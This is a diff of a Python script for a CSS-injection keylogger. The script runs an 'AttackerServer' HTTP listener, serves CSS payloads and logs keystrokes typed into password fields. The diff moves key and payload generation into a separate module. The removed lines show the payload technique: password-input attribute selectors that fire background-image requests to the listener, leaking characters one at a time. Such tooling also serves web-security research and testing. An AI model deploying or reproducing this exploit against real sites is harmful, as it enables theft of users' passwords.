@@ -1,7 +1,6 @@
 #!/usr/bin/python3
-
+from generator import generate_payload, generate_keys
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from itertools import product
 import argparse, logging, math, urllib.parse, re, os, json
 
 description = '''Start server to receive key strokes inside password input fields:
@@ -31,15 +30,13 @@ parser.add_argument("-l", "--listen", type = str, default="127.0.0.1", help="IP 
 args = parser.parse_args()
 
 params = {
+    "num_selectors": args.num_selectors,
     "attribute": args.attribute,
     "element": args.element,
     "e_type": args.type,
     "ip": args.listen,
     "port": args.port
 }
-
-# Assert that input file exists
-assert os.path.isfile(args.input), f"File {args.input} does not exist"
 
 # Initialize logging
 logger = logging.getLogger(__name__)
@@ -49,63 +46,19 @@ handler = logging.StreamHandler()
 handler.setFormatter(formatter)
 logger.addHandler(handler)
 
-def generate_keys(file_name: str) -> list:
-    # Defined in https://www.w3.org/TR/CSS21/syndata.html#characters
-    # Read JSON file
-    json_obj = None
-    with open(file_name, "r") as f:
-        json_obj = json.load(f)
-    assert json_obj, f"Failed to read JSON file {file_name}"
+# Check if file exists
+if not os.path.isfile(args.input):
+    logger.error(f"File {args.input} does not exist")
+    exit(1)
 
-    '''
-    {
-        "1": {
-            "1": 661586,
-            "2": 462186,
-            "3": 276015,
-        },
-        "2": {...},
-        "3": {...},
-    }
-    '''
-    combinations = [int(k) for k in json_obj.keys()]
-    combinations.sort()
-    assert 1 in combinations, "Size '1' must be present in the JSON file"
-
-    # Convert every combination to a list of characters sorted by frequency (descending)
-    for k in combinations:
-        # Sort by frequency (descending)
-        json_obj[str(k)] = sorted(json_obj[str(k)].items(), key=lambda x: x[1], reverse=True)
-        # Convert to list of characters
-        json_obj[str(k)] = [x[0] for x in json_obj[str(k)]]
-
-    total_combinations = sum(len(json_obj[str(k)]) for k in combinations)
-    if total_combinations < args.num_selectors:
-        logger.warning(f"Total number of combinations ({total_combinations}) is less than the limit ({args.num_selectors}) of selectors. Consider increasing the amount of characters to analyze")
-
-    keys = []
-    # top_most is a multiplier for the amount of characters to add
-    # 100 % of 1-character combinations, 50 % of 2-character combinations, 25 % of 3-character combinations, etc.
-    top_most, s_limit = 1, args.num_selectors
-
-    # Edgecase: More characters than selectors
-    if len(json_obj["1"]) > s_limit:
-        # Only add 1-character combinations
-        if s_limit >= 8000:
-            logger.warning(f"Number of 1-character combinations ({len(json_obj['1'])}) exceeds the limit ({s_limit}). Consider reducing the amount of characters to analyze")
-        return json_obj["1"][:s_limit]
-
-    # Add all combinations until the limit is reached
-    for k in combinations:
-        remaining = s_limit - len(keys)
-        if remaining <= 0:
-            break
-        amount = min(remaining, math.ceil(len(json_obj[str(k)]) * top_most))
-        logger.debug(f"Adding {amount} {k}-character combinations")
-        keys.extend(json_obj[str(k)][:amount])
-        top_most *= 0.5
-
-    return keys
+# Load JSON file
+combinations = None
+with open(args.input, "r") as f:
+    combinations = json.load(f)
+assert combinations, f"Failed to read JSON file {args.input}"
+# Print some statistics
+if args.verbose:
+    generate_keys(combinations.copy(), args.num_selectors, logger=logger)
 
 # Global variable to store keystrokes
 keystrokes = ""
@@ -132,32 +85,6 @@ def merge_stroke(stroke):
 
     print(f"Keystrokes: {keystrokes}")
 
-
-def generate_payload(element: str = "input", attribute: str = "value", e_type: str = None, ip: str = "127.0.0.1", port: int = 8000) -> str:
-    '''
-    input[type="password"][value$="x"] {
-        background-image: url("http://127.0.0.1:8000/?k=x");
-    }
-    '''
-    # This is a mess
-    type_selector = f"[type='{e_type}']" if e_type else ""
-    url = f"http://{ip}:{port}/?k={{3}}"
-    selector = f"{element}{type_selector}[{attribute}$='{{2}}']"
-    selector += f"{{0}} background-image: url('{url}'); {{1}}\n"
-
-    # Build payload
-    payload = ""
-    for k in generate_keys(args.input):
-        # Split into list of characters and convert to hex unicode value
-        k = [format(ord(c), 'x') for c in k]
-        char_selector = "\\" + "\\".join(k)
-        # comma-separated list of character codes
-        char_url = ",".join(k)
-        payload += selector.format("{", "}", char_selector, char_url)
-    # Visualize that the payload had been received and read by the useragent
-    payload += "body{background-color: red;}"
-
-    return payload
 
 class AttackerServer(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -201,7 +128,7 @@ class AttackerServer(BaseHTTPRequestHandler):
             keystrokes = ""
 
             logger.info(f"Start generating payload for {client_ip}")
-            response = generate_payload(**params)
+            response = generate_payload(combinations.copy(), **params)
             logger.info(f"Payload for {client_ip} generated. Size: {len(response) / 1024:.2f} KB")
             self.send_header('Content-type', 'text/css')
         else:
